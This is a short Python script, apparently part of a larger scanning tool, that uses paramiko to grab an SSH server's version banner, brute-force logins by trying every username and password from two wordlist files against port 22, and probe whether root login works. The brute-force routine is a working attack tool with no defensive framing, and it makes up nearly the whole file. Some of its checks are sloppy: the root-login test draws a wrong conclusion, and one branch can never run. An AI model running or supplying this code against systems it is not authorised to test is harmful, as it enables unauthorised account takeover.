import paramiko
import os
import socket
import sys
import threading


def banner_grab_ssh(ip):
    # Get the SSH banner to check the version
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        transport = paramiko.Transport((ip, 22))
        transport.start_client()
        banner = transport.remote_version
        print(f"SSH Banner: {banner}")
        transport.close()
        return banner
    except Exception as e:
        print(f"Failed to grab SSH banner: {e}")
        return None

def brute_force_ssh(ip, username_file, password_file):
    # Brute-force login attempts using paramiko
    print(f"Starting brute force attack on SSH server at {ip}...")
    with open(username_file, 'r') as uf, open(password_file, 'r') as pf:
        usernames = [line.strip() for line in uf]
        passwords = [line.strip() for line in pf]

    for username in usernames:
        for password in passwords:
            try:
                print(f"Trying {username}:{password}...")
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port=22, username=username, password=password)
                print(f"Login successful with {username}:{password}")
                ssh.close()
                return True
            except paramiko.AuthenticationException:
                # Login failed, continue trying
                pass
            except Exception as e:
                print(f"Error occurred during brute-force attempt: {e}")
                return False
    print("Brute-force attack finished, no valid credentials found.")
    return False

def check_root_login(ip):
    # Check if root login is allowed (if username 'root' works)
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=22, username='root', password='wrong_password')
    except paramiko.AuthenticationException:
        print("Root login is disabled or protected by a password.")
    except Exception as e:
        print(f"Root login check error: {e}")

def ssh_info(ip):
    # Gather IP and scan for SSH vulnerabilities
    
    if True:
        # Grab the SSH banner
        banner = banner_grab_ssh(ip)
        if banner:
            print(f"SSH Version Detected: {banner}")
        
        # Brute force login attempt
        username_file = 'usernames.txt'
        password_file = 'passwords.txt'
        brute_force_ssh(ip, username_file, password_file)
        
        # Check if root login is enabled
        check_root_login(ip)
    else:
        print("SSH service not detected or port 22 is closed.")

def ssh(target,port):
    ssh_info(target)
    print("coming soon...")
    